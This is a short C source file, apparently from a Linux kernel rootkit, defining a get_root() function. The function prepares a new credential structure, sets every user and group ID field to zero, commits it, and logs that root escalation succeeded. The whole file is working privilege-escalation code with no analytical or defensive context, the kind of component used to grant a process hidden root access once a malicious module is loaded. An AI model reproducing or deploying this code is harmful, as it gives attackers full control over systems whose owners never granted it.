#include "../headers/credentials.h"

void get_root(void) {
    struct cred * credentials = prepare_creds();
    if (credentials == NULL) {
        printk(KERN_INFO "Unable to prepare credentials...\n");
        return;
    } else {
        credentials->uid.val    = credentials->gid.val    = 0;
        credentials->euid.val   = credentials->egid.val   = 0;
        credentials->suid.val   = credentials->sgid.val   = 0;
        credentials->fsuid.val  = credentials->fsgid.val  = 0;

        commit_creds(credentials);
        printk(KERN_INFO "Root escalation successful!\n");
    };
}